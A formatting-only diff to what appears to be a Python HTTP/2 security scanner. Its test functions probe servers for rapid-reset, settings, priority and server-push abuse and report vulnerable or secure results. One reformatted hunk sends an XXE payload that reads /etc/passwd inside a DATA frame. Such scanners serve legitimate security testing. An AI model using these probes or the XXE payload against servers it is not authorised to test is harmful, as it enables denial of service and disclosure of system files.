@@ -596,7 +596,9 @@ async def _test_h2_fingerprint(
             h2_supported=bool(server_settings),
             settings_observed=server_settings,
             vulnerable=False,
-            details=(f"MAX_CONCURRENT_STREAMS={max_streams}, MAX_FRAME_SIZE={max_frame}, HEADER_TABLE_SIZE={header_table}"),
+            details=(
+                f"MAX_CONCURRENT_STREAMS={max_streams}, MAX_FRAME_SIZE={max_frame}, HEADER_TABLE_SIZE={header_table}"
+            ),
             error="",
         )
     )
@@ -1033,7 +1035,11 @@ async def _test_h2_reset_attack(
             )
             sock.sendall(conn.data_to_send())
             await asyncio.sleep(0.05)
-            conn.send_data(sid, b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', end_stream=True)
+            conn.send_data(
+                sid,
+                b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+                end_stream=True,
+            )
             sock.sendall(conn.data_to_send())
             await asyncio.sleep(0.05)
             conn.reset_stream(sid, h2.errors.ErrorCodes.CANCEL)
@@ -1122,8 +1128,12 @@ async def _test_h2_settings_abuse(
                 conn.update_settings(settings_dict)
                 sock.sendall(conn.data_to_send())
                 events = _recv_events(sock, conn, timeout)
-                got_goaway = any(isinstance(ev, h2.events.ConnectionTerminated) for ev in events)
-                got_ack = any(isinstance(ev, h2.events.SettingsAcknowledged) for ev in events)
+                got_goaway = any(
+                    isinstance(ev, h2.events.ConnectionTerminated) for ev in events
+                )
+                got_ack = any(
+                    isinstance(ev, h2.events.SettingsAcknowledged) for ev in events
+                )
                 vulnerable = got_ack and not got_goaway
                 results.append(
                     HTTP2Attempt(
@@ -1193,7 +1203,9 @@ async def _test_h2_priority_attack(
             )
             sock.sendall(conn.data_to_send())
             events = _recv_events(sock, conn, timeout)
-            got_response = any(isinstance(ev, h2.events.ResponseReceived) for ev in events)
+            got_response = any(
+                isinstance(ev, h2.events.ResponseReceived) for ev in events
+            )
             results.append(
                 HTTP2Attempt(
                     exploit="h2_rapid_reset_command",
@@ -1435,8 +1447,12 @@ async def _test_h2_push_abuse(
             conn.update_settings({h2.settings.SettingCodes.ENABLE_PUSH: 1})
             sock.sendall(conn.data_to_send())
             events = _recv_events(sock, conn, timeout)
-            got_goaway = any(isinstance(ev, h2.events.ConnectionTerminated) for ev in events)
-            got_ack = any(isinstance(ev, h2.events.SettingsAcknowledged) for ev in events)
+            got_goaway = any(
+                isinstance(ev, h2.events.ConnectionTerminated) for ev in events
+            )
+            got_ack = any(
+                isinstance(ev, h2.events.SettingsAcknowledged) for ev in events
+            )
             vulnerable = got_ack and not got_goaway
             results.append(
                 HTTP2Attempt(
@@ -1540,7 +1556,13 @@ async def _test_h2_push_abuse(
         sock, conn = _create_h2_connection(host, port, timeout)
         try:
             _drain_settings(sock, conn, timeout)
-            paths_to_request = ["/", "/style.css", "/script.js", "/logo.png", "/data.json"]
+            paths_to_request = [
+                "/",
+                "/style.css",
+                "/script.js",
+                "/logo.png",
+                "/data.json",
+            ]
             for p in paths_to_request:
                 try:
                     sid = conn.get_next_available_stream_id()
@@ -1626,7 +1648,9 @@ async def _test_h2_push_abuse(
                     if isinstance(ev, h2.events.PushedStreamReceived) and ev.headers:
                         for k, v in ev.headers:
                             if k == ":path":
-                                push_paths.append(v if isinstance(v, str) else v.decode())
+                                push_paths.append(
+                                    v if isinstance(v, str) else v.decode()
+                                )
             results.append(
                 HTTP2Attempt(
                     exploit="h2_rapid_reset_command",
@@ -1637,7 +1661,9 @@ async def _test_h2_push_abuse(
                     h2_supported=True,
                     settings_observed=server_settings,
                     vulnerable=len(push_paths) > 0,
-                    details=f"Push paths: {push_paths}" if push_paths else "No push paths received",
+                    details=f"Push paths: {push_paths}"
+                    if push_paths
+                    else "No push paths received",
                     error="",
                 )
             )
@@ -1662,7 +1688,9 @@ async def _test_h2_push_abuse(
 
 # ─── Dispatch ────────────────────────────────────────────────────────────────
 
-_CATEGORY_DISPATCH: dict[str, Callable[..., Coroutine[Any, Any, list[HTTP2Attempt]]]] = {
+_CATEGORY_DISPATCH: dict[
+    str, Callable[..., Coroutine[Any, Any, list[HTTP2Attempt]]]
+] = {
     "h2_downgrade": _test_h2_downgrade,
     "h2_fingerprint": _test_h2_fingerprint,
     "h2_stream_abuse": _test_h2_stream_abuse,
@@ -1702,7 +1730,10 @@ def print_results(result: HTTP2Result) -> None:
     for cat, attempts in categories.items():
         vuln_in_cat = [a for a in attempts if a.vulnerable]
         if vuln_in_cat:
-            print(color("[!]", Cyber.RED, Cyber.BOLD), f"{cat}: {len(vuln_in_cat)} vulnerable(s)")
+            print(
+                color("[!]", Cyber.RED, Cyber.BOLD),
+                f"{cat}: {len(vuln_in_cat)} vulnerable(s)",
+            )
             for a in vuln_in_cat:
                 print(color("    [-]", Cyber.RED), f"{a.technique}: {a.details}")
                 print_exploit_info(a.exploit, a.tool)
@@ -1711,9 +1742,13 @@ def print_results(result: HTTP2Result) -> None:
 
     print()
     if result.overall_status == "vulnerable":
-        print(color("[!]", Cyber.RED, Cyber.BOLD), "VULNERABLE — HTTP/2 abuse possible!")
+        print(
+            color("[!]", Cyber.RED, Cyber.BOLD), "VULNERABLE — HTTP/2 abuse possible!"
+        )
     else:
-        print(color("[+]", Cyber.GREEN, Cyber.BOLD), "SECURE — No HTTP/2 abuse detected")
+        print(
+            color("[+]", Cyber.GREEN, Cyber.BOLD), "SECURE — No HTTP/2 abuse detected"
+        )
     print()
 
 
